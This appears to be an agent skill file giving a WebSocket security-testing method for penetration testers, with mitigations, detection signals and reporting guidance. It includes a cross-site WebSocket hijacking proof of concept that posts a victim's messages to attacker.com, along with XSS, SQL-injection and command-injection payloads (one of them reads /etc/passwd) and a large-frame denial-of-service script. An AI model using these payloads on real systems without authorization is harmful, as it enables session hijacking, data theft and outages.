---
name: offensive-websocket
description: "WebSocket security testing methodology — handshake / Origin validation, authentication / authorization on the WebSocket layer (token validation flaws, anonymous access), message-injection attacks (XSS via reflected messages, command injection through ws-bridge to backend), Cross-Site WebSocket Hijacking (CSWSH), CSWSH against authenticated WebSockets, message replay and tampering, denial of service via large frames, and Burp's WebSocket interception workflow. Use when an application uses WebSocket connections (chat, real-time collaboration, trading platforms, IoT dashboards)."
---

# WebSocket Attacks

WebSockets bypass the Origin / SameSite protections of regular HTTP — by design. Authentication, authorization, and input validation must be done explicitly per-message, and many applications do them only at handshake time.

## Quick Workflow

1. Identify WebSocket endpoints (browser DevTools → Network → WS)
2. Capture handshake; check Origin enforcement
3. Test anonymous connection (no cookies)
4. Test post-handshake authorization per message type
5. Test message-content injection sinks

---

## WebSocket Refresher

```
Client: GET /chat HTTP/1.1
        Host: app.com
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: <base64>
        Origin: https://app.com
        Cookie: SESSIONID=...

Server: HTTP/1.1 101 Switching Protocols
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Accept: <derived>

→ Bidirectional message channel
```

After upgrade, frames flow either direction. The cookies sent at handshake authenticate the entire connection; subsequent frames don't re-auth unless the server explicitly does so.

## Test 1: Anonymous Connection

```bash
# wscat — simple WebSocket client
npm install -g wscat

# Try without cookies
wscat -c "wss://app.com/chat"

# Try with no Origin
wscat -c "wss://app.com/chat" --no-headers
```

If the server accepts without authentication, every WS endpoint is open to all.

## Test 2: Origin Validation

```bash
# Connect with attacker Origin
wscat -c "wss://app.com/chat" -H "Origin: https://attacker.com"
```

If accepted, **CSWSH is possible** — see below.

The check should be:
- `Origin` matches a fixed allowlist of expected origins
- Or, full token-based auth that doesn't rely on cookies

If the server only checks "Origin starts with https" or accepts any non-empty Origin → fail.

## Test 3: Authorization Per Message

```bash
wscat -c "wss://app.com/chat"
> {"action": "subscribe", "channel": "user-1042"}     # this is your own channel
{"event":"subscribed","channel":"user-1042"}

> {"action": "subscribe", "channel": "user-2"}        # someone else's
{"event":"subscribed","channel":"user-2"}             # ← BUG if accepted

> {"action": "send", "channel": "user-2", "msg": "hijacked"}
```

Authorization must be checked per message, not just at connect.

### Common Message-Level Auth Bugs

- Subscribe to any channel without authorization
- Send messages on behalf of others
- Receive admin-only messages by claiming the admin channel
- Modify other users' state via channel commands

## Cross-Site WebSocket Hijacking (CSWSH)

Like CSRF, but for WebSocket connections.

```html
<!-- attacker.com -->
<script>
const ws = new WebSocket('wss://app.com/chat');
ws.onmessage = e => {
  fetch('https://attacker.com/exfil', { method: 'POST', body: e.data });
};
ws.onopen = () => {
  ws.send(JSON.stringify({action: 'list-private-data'}));
};
</script>
```

When the victim visits attacker.com, browser opens WebSocket to app.com **with the victim's cookies attached** (cookies sent on handshake). All subsequent messages flow to attacker's JS handlers.

### Why CSWSH Is Worse Than CSRF

- CSRF can write but not read (without CORS misconfig)
- CSWSH always allows full bidirectional read because WS is an interactive channel

Mitigation:
- Validate `Origin` strictly server-side
- Use a token in the handshake URL (`?token=...`) and require it
- Avoid cookie-based auth for WebSocket

## Test 4: Message Content Injection

WebSocket messages often flow into:
- HTML rendering (chat messages displayed) → reflected XSS
- Backend command execution (real-time admin commands)
- Database queries (search-as-you-type)

```bash
wscat -c "wss://app.com/chat"
> {"msg": "<script>alert(1)</script>"}
# Receive on other clients — XSS triggered if not sanitized

> {"action": "search", "q": "'; DROP TABLE users; --"}
# Backend SQL injection if WebSocket bridges to SQL

> {"cmd": "ping", "host": "8.8.8.8; cat /etc/passwd"}
# Command injection in backend handler
```

## Replay & Tampering

WebSocket messages typically have no integrity / sequence protection beyond the TLS layer. Within a session:

```bash
# Capture full WS session in Burp; modify and replay individual messages
# Burp's WebSocket history allows manual frame editing and replay
```

If session tokens / nonces / sequence numbers should prevent replay but aren't enforced, replays succeed.

## Authentication Bypass via Handshake

Some apps require handshake auth but treat post-handshake as freely usable. Flip:

- Auth via valid session for handshake
- Then send messages claiming to be a different user
- If user identity is in each message and not bound to handshake → impersonation

## DoS via Large Frames

WebSocket frame size is implementation-defined. Send very large frames:

```python
import websocket
ws = websocket.WebSocket()
ws.connect("wss://app.com/chat")
ws.send("A" * 10_000_000)   # 10 MB single message
```

If server allocates buffer per frame without limit, OOM. With ROE explicit, test with care.

## Sub-Protocols and Extensions

```
Sec-WebSocket-Protocol: graphql-ws, soap, custom-binary
Sec-WebSocket-Extensions: permessage-deflate
```

Each sub-protocol may have its own validation. Test against custom sub-protocols for parsing flaws.

## Tooling

| Tool | Use |
|---|---|
| Burp Suite | Full WebSocket interception, edit, replay |
| `wscat` | Quick interactive client |
| `websocketd` | Bridge stdin/stdout to WebSocket for testing |
| `cssworm` | CSWSH PoC generator |
| Browser DevTools | Network → WS → frames + sending |

## Engagement Cheatsheet

```bash
# 1. Identify WS endpoints
# Browser DevTools → Network → WS filter

# 2. Capture handshake and verify auth
# Burp interception of GET /ws

# 3. Test anonymous connection
wscat -c "wss://app.com/<endpoint>"

# 4. Test Origin enforcement
wscat -c "wss://app.com/<endpoint>" -H "Origin: https://attacker.com"

# 5. Test post-handshake auth per message
# Send messages claiming other users / channels / admin actions

# 6. Test message-content sinks (XSS, SQLi, commands)

# 7. CSWSH PoC:
# attacker.com page that opens WS to victim app and exfils messages

# 8. Document: endpoint, missing check, example messages, impact
```

## Detection

| Signal | Defender View |
|---|---|
| Handshake from unexpected Origin | WAF / log alarm |
| Long-running WS from single client with anomalous traffic pattern | App-level metrics |
| Mass subscribe to unrelated channels | Application logic alarm |
| OOM events on WS server | Operational alert |

WebSockets are often less monitored than HTTP. Mature programs add app-level WS-specific monitoring.

## Reporting

- Endpoint URL
- Authentication / Origin enforcement state
- Specific message types that bypass authorization
- CSWSH PoC if applicable
- Specific data accessible cross-origin
- Recommended fix (Origin allowlist, token-in-URL, per-message authz)

---

## Key References

- OWASP Cheat Sheet: WebSocket Security
- "Cross-Site WebSocket Hijacking" (Christian Schneider, 2013)
- RFC 6455 — The WebSocket Protocol
- PortSwigger Web Security Academy: WebSocket chapter
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/websocket.md
